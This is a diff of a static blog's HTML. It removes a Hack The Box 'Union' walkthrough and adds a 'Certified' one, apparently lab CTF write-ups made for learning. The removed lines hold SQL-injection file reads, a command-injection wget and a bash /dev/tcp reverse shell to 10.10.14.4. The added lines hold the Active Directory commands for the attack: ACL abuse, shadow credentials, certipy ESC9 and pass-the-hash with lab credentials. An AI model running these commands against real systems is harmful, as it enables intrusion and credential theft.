+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101195630.png?raw=true" alt="Pasted image 20250101195630.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>While analyzing the data I found Interesting things</li>
+<li><strong>These are my findings:</strong></li>
+<li>The user <code>Judith</code> has WriteOwner permissions over group <code>MANAGEMENT@CERTIFIED.HTB</code></li>
+<li>The group <code>Management@certified.htb</code> has Generic all permission over user <code>management_svc@certified.htb</code></li>
+<li>The user <code>MANAGEMENT_SVC@CERTIFIED.HTB</code> has CanPsRemote permission on the Domain controller(This is not quite useful. At the end we will be abusing AD CS instead of this)
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101202115.png?raw=true" alt="Pasted image 20250101202115.png" />
+    
+  </figure>
+</li>
+</ul>
+
 
 <h2 class="relative group">Exploitation 
     <div id="exploitation" class="anchor"></div>
@@ -1432,89 +1236,156 @@ PORT   STATE SERVICE VERSION
     
 </h2>
 <ul>
-<li>This is one of the reasons why sql injection is so dangerous we can read system files using SQLi if it&rsquo;s misconfigured. Using the below payload I got the <code>/etc/passwd</code> file data</li>
+<li>Time is very crucial for these kind of attacks so synced the time with the target system</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select load_file(&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="s1">&#39;); -- -
-</span></span></span></code></pre></div><ul>
-<li><strong>Output:</strong></li>
-</ul>
-<pre tabindex="0"><code>Sorry, root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-htb:x:1000:1000:htb:/home/htb:/bin/bash
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
-mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
-uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
- you are not eligible due to already qualifying.
-</code></pre><ul>
-<li>
-<p>From reading the <code>/etc/passwd</code> file I identified three valid users to access the system</p>
-</li>
-<li>
-<p>We can also read the source code of this page</p>
-</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select load_file(&#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;); -- -
-</span></span></span></code></pre></div><ul>
-<li>If you remember earlier we found <code>config.php</code> via the directory fuzzing, so let&rsquo;s try getting it</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select load_file(&#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">config</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;); -- -
-</span></span></span></code></pre></div><ul>
-<li><strong>Output:</strong></li>
-</ul>
-<pre tabindex="0"><code>Sorry, &lt;?php
-  session_start();
-  $servername = &#34;127.0.0.1&#34;;
-  $username = &#34;uhc&#34;;
-  $password = &#34;&lt;redacted&gt;&#34;;
-  $dbname = &#34;november&#34;;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo rdate -n certified.htb
+</span></span></code></pre></div>
 
-  $conn = new mysqli($servername, $username, $password, $dbname);
-?&gt;
- you are not eligible due to already qualifying.
-</code></pre><ul>
-<li>We got the exposed password from the website configuration. Accessed the system using SSH and got the 
+<h4 class="relative group">WriteOwner Abuse 
+    <div id="writeowner-abuse" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#writeowner-abuse" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li>First we need to be an user of <code>MANAGEMENT@CERTIFIED.HTB</code></li>
+<li>Using this command, I can change the ownership of the object to the user which I own</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">owneredit.py -action write -new-owner <span class="s1">&#39;judith.mader&#39;</span> -target <span class="s1">&#39;Management&#39;</span> <span class="s1">&#39;certified.htb/judith.mader:judith09&#39;</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101212751.png?raw=true" alt="Pasted image 20250101212751.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>To abuse ownership of a group object, I need to grant myself the AddMember privilege. Impacket&rsquo;s dacledit can be used for this purpose</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dacledit.py -action <span class="s1">&#39;write&#39;</span> -rights <span class="s1">&#39;WriteMembers&#39;</span> -principal <span class="s1">&#39;judith.mader&#39;</span> -target-dn <span class="s1">&#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&#39;</span> <span class="s1">&#39;certified.htb/judith.mader:judith09&#39;</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101212835.png?raw=true" alt="Pasted image 20250101212835.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Now I can add the user to the group using <code>net</code> tool</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net rpc group addmem <span class="s2">&#34;Management&#34;</span> <span class="s2">&#34;judith.mader&#34;</span> -U <span class="s2">&#34;certified.htb/judith.mader%judith09&#34;</span> -S <span class="s2">&#34;DC01.certified.htb&#34;</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213012.png?raw=true" alt="Pasted image 20250101213012.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Now that the user <code>judith</code> has become member of the group <code>MANAGEMENT@CERTIFIED.HTB</code> I can move to the next step</li>
+</ul>
+
+
+<h4 class="relative group">GenericWrite Abuse 
+    <div id="genericwrite-abuse" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#genericwrite-abuse" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    
+Definition
+
+  </span>
+</span>
+
+<ul>
+<li>
+<p>The bottom line of <code>GenericWrite</code> is &ndash;&gt; Generic Write Abuse is a type of attack in Active Directory (AD) where an attacker with GenericWrite permissions over an object (such as a user, group, or computer) can modify certain attributes of that object to escalate privileges, maintain persistence, or execute malicious commands.</p>
+</li>
+<li>
+<p>I can also change the password of the account but for me using Shadow Credentials Technique is optimal</p>
+</li>
+</ul>
+<span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    
+Definition
+
+  </span>
+</span>
+
+<ul>
+<li>Shadow Credentials Attack is a technique used by attackers to gain persistent access to an Active Directory (AD) environment by manipulating key authentication data. It involves exploiting the way AD handles alternative credentials such as key pairs or certificates associated with user or computer accounts.</li>
+</ul>
+
+<details>
+  <summary>View links</summary>
+  <p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials" target="_blank">Article-1</a> <br> <a href="https://www.hackingarticles.in/shadow-credentials-attack/" target="_blank">Article-2</a></p>
+</details>
+
+<ul>
+<li>Performing shadow credential attack:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pywhisker -d certified.htb -u judith.mader -p judith09 --target management_svc --action add
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213236.png?raw=true" alt="Pasted image 20250101213236.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Getting the TGT</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx 2QCAj1n0.pfx -pfx-pass AxYpGIRkSbtAKz4T0aJ4 management_svc.ccache
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213528.png?raw=true" alt="Pasted image 20250101213528.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Using the TGT cache to get the NT hash</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">KRB5CCNAME</span><span class="o">=</span>../management_svc.ccache python3 getnthash.py certified.htb/management_svc -key 841420e74637606f21b9eaaec6a8bfd2cc98eff7fb5167daddb131f3127a96b0
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213938.png?raw=true" alt="Pasted image 20250101213938.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Now that I got the hash passing it to login in EvilwinRm as user <code>management_svc</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u management_svc -H a091c1832bcdd46&lt;SNIP&gt; -i certified.htb
+</span></span></code></pre></div><ul>
+<li>Got access as user <code>management_svc</code></li>
+<li>Got the 
 <div class="flex mt-2">
 <span
   class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
 >
   <span class="flex flex-row items-center">
     
-    <span>user flag</span>
+    <span>User flag</span>
   </span>
 </span>
 </div>
 
   <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113005214.png?raw=true" alt="Pasted image 20250113005214.png" />
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101214048.png?raw=true" alt="Pasted image 20250101214048.png" />
+    
+  </figure>
+
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/LgfEAwXpSCcAAAAC/job-aint-done-yet-jidon-adams.gif" alt="We-got-more" />
     
   </figure>
 </li>
@@ -1532,55 +1403,157 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
     
 </h2>
 <ul>
-<li>Quickly I started enumerating and eventually looked into the <code>firewall.php</code> code and I can see the vulnerable code</li>
+<li>As the machine name suggests, Lets enumerate AD CS using <a href="https://github.com/ly4k/Certipy" target="_blank">certipy</a> tool</li>
+<li>In case if you haven&rsquo;t heard about this tool, <a href="https://github.com/ly4k/Certipy" target="_blank">Certipy</a> is an offensive tool for enumerating and abusing Active Directory Certificate Services(AD CS).</li>
+<li>Certipy can be easily installed using python</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">  <span class="p">};</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;sudo /usr/sbin/iptables -A INPUT -s &#34;</span> <span class="o">.</span> <span class="nv">$ip</span> <span class="o">.</span> <span class="s2">&#34; -j ACCEPT&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><ul>
-<li>This above part is vulnerable to command Injection, after a while I pictured the payload and I tested with this header payload and it worked</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install certipy-ad
+</span></span></code></pre></div><ul>
+<li>or using pipx</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">X-FORWARDED-FOR: 8.8.8.8<span class="p">;</span> wget http://10.10.14.4:8000/Union_AllPorts.txt<span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pipx install certipy-ad
+</span></span></code></pre></div><ul>
+<li>On using certipy I came to know that user <code>ca_operators</code> has esc9 vulnerability</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy find -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -vulnerable -enabled -old-bloodhound
+</span></span></code></pre></div><ul>
+<li>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101224245.png?raw=true" alt="Pasted image 20250101224245.png" />
+    
+  </figure>
+</li>
+</ul>
+
+
+<h4 class="relative group">Abusing the AD CS 
+    <div id="abusing-the-ad-cs" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#abusing-the-ad-cs" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+
+  
+  
+  
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >Note: This requires perfect time coordination and each command execution intervel should not exceed two minutes before executing next command</span>
+</div>
+
+<ul>
+<li>Lets perform shadow credentials on user <code>ca_operators</code> from <code>management_svc</code> user, since I have <code>GenericAll</code> DACL over it.</li>
+<li>Using shadow technique I got the hash of user <code>ca_operator</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy shadow auto -u management_svc@certified.htb -hashes &lt;hashes&gt; -account ca_operator
 </span></span></code></pre></div><p>
   <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113011912.png?raw=true" alt="Pasted image 20250113011912.png" />
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102060054.png?raw=true" alt="Pasted image 20250102060054.png" />
     
   </figure>
 </p>
 <ul>
-<li>Prepared a reverse shell payload and got the shell with this</li>
+<li>I changed the user principal to administrator</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">X-FORWARDED-FOR: 8.8.8.8<span class="p">;</span> bash -c <span class="s1">&#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.4/6001 &lt;&amp;1&#39;</span><span class="p">;</span>
-</span></span></code></pre></div><ul>
-<li>Upgraded the shell to be more stable using a new technique that I have learnt recently</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
-</span></span></code></pre></div><ul>
-<li>Then foreground the shell with <code>CTRL+Z</code></li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-</span></span></code></pre></div><ul>
-<li>In the shell type this to allign it with our terminal</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reset
-</span></span></code></pre></div><ul>
-<li>Now the shell is upgraded</li>
-<li>Issued this command <code>sudo -l</code> and found that <code>sudo</code> can be run with anything
-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy account update -u management_svc@certified.htb -hashes &lt;hash&gt; -user ca_operator -upn administrator
+</span></span></code></pre></div><p>
   <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113012401.png?raw=true" alt="Pasted image 20250113012401.png" />
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102011822.png?raw=true" alt="Pasted image 20250102011822.png" />
     
   </figure>
-</li>
-<li>Now easily ran the bash with root privileges</li>
+</p>
+<ul>
+<li>Now abuse the template to get administrator pfx</li>
 </ul>
-<pre tabindex="0"><code>sudo /bin/bash
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -username ca_operator@certified.htb -hashes &lt;hash&gt; -ca certified-DC01-CA -template CertifiedAuthentication
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102012113.png?raw=true" alt="Pasted image 20250102012113.png" />
+    
+  </figure>
+
+
+  
+  
+  
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >Note: This above step was failing for me with throwing <code>Netbios timeout</code> error. When it worked, It gave me the pfx of user <code>ca_operator</code>, for a weird reason when I redo all the steps from step one it worked.</span>
+</div>
+</p>
+<ul>
+<li>Now I Changed the user principal back to the same</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy account update -u management_svc@certified.htb -hashes &lt;hash&gt; -user ca_operator -upn ca_operator@certified.htb
+</span></span></code></pre></div><ul>
+<li>I easily got the administrator NTLM hash from using this command with <code>administrator.pfx</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -domain certified.htb
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102012703.png?raw=true" alt="Pasted image 20250102012703.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Then I logged in with Administrator user&rsquo;s NT part of the hash</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u administrator -H &lt;hash&gt; -i certified.htb
+</span></span></code></pre></div><ul>
 <li>Got the 
 <div class="flex mt-2">
 <span
@@ -1594,17 +1567,17 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
 </div>
 
   <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113012505.png?raw=true" alt="Pasted image 20250113012505.png" />
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102012907.png?raw=true" alt="Pasted image 20250102012907.png" />
     
   </figure>
 </li>
 </ul>
-<div id="typeit-27e0c872d57f3d9eb75f36e646aa748a"></div>
+<div id="typeit-e38e15ecda1a01270ac9ad3a490eb779"></div>
 
 <script>
     document.addEventListener("DOMContentLoaded", function () {
-      new TypeIt("#typeit-27e0c872d57f3d9eb75f36e646aa748a", {
-        strings: [" This was a short box interms of my walkthrough. Anyway, see you again nextime...... "],
+      new TypeIt("#typeit-e38e15ecda1a01270ac9ad3a490eb779", {
+        strings: [" This was a fun box I personally learnt a lot from this box. I hope you enjoyed my walkthrough, Until nextime..... "],
         speed:  100 ,
         lifeLike:  false ,
         startDelay:  0 ,
@@ -1616,7 +1589,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
 </script>
 <p>
   <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/ORShRT5zN1MAAAAC/we%27ll-see-you-next-time-samus-paulicelli.gif" alt="end" />
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/c2h1smWX3JAAAAAC/talk-to-you-later-ttyl-ttyl-talk-to-you-later.gif" alt="End" />
     
   </figure>
 </p>
@@ -1629,61 +1602,6 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
         
 
         
-<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5">
-    
-    <summary
-        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
-        Hack The Box - This article is part of a series.
-    </summary>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/">
-            Part 1: Forest Walkthrough(HTB)
-        </a>
-    </div>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/Secure-The-Throne/posts/1741592170890-backend-walkthroughhtb/">
-            Part 2: Backend Walkthrough(HTB)
-        </a>
-    </div>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
-            Part 3: Caption Walkthrough(HTB)
-        </a>
-    </div>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
-            Part 4: Perfection Walkthrough(HTB)
-        </a>
-    </div>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        Part 5: This Article
-    </div>
-    
-    
-
-
-</details>
-
         
   
   <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
@@ -1692,7 +1610,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/&amp;title=Union%20Walkthrough%28HTB%29"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/&amp;title=Certified%20Walkthrough%28HTB%29"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -1711,7 +1629,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/&amp;text=Union%20Walkthrough%28HTB%29"
+      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/&amp;text=Certified%20Walkthrough%28HTB%29"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -1729,7 +1647,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
